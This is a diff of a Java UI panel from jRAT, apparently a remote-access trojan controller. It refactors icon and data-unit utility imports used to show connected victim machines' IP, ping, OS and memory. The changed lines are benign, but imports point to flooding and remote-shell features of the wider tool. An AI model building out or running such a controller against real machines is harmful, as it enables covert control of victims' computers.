@@ -1,5 +1,7 @@
 package se.jrat.controller.ui.panels;
 
+import iconlib.IconUtils;
+
 import java.awt.Color;
 import java.awt.Component;
 import java.awt.event.ActionEvent;
@@ -29,6 +31,7 @@ import jrat.api.RATMenuItem;
 import jrat.api.RATObject;
 import se.jrat.common.Flood;
 import se.jrat.common.downloadable.Downloadable;
+import se.jrat.common.utils.DataUnits;
 import se.jrat.controller.AbstractSlave;
 import se.jrat.controller.Main;
 import se.jrat.controller.Slave;
@@ -67,11 +70,9 @@ import se.jrat.controller.ui.frames.FrameRemoteShell;
 import se.jrat.controller.ui.frames.FrameRename;
 import se.jrat.controller.ui.frames.FrameSystemInfo;
 import se.jrat.controller.ui.renderers.table.DefaultJTableCellRenderer;
-import se.jrat.controller.utils.IconUtils;
+import se.jrat.controller.utils.BasicIconUtils;
 import se.jrat.controller.utils.NetUtils;
 import se.jrat.controller.utils.Utils;
-
-import com.redpois0n.graphs.utils.DataUnits;
 
 @SuppressWarnings("serial")
 public class PanelMainClients extends JScrollPane {
@@ -256,12 +257,12 @@ public class PanelMainClients extends JScrollPane {
 				} else if (colname.equals(Columns.IP.getName())) {
 					label.setText(slave.getIP());
 				} else if (colname.equals(Columns.PING.getName())) {
-					label.setIcon(IconUtils.getPingIcon(slave));
+					label.setIcon(BasicIconUtils.getPingIcon(slave));
 					label.setText(slave.getPing() + " ms");
 				} else if (colname.equals(Columns.USER_HOST.getName())) {
 					label.setText(slave.formatUserString());
 				} else if (colname.equals(Columns.OPERATINGSYSTEM.getName())) {
-					label.setIcon(IconUtils.getOSIcon(slave));
+					label.setIcon(BasicIconUtils.getOSIcon(slave));
 					label.setText(slave.getOperatingSystem().getDisplayString());
 				} else if (colname.equals(Columns.RAM.getName())) {
 					label.setText(DataUnits.getAsString(slave.getMemory()));
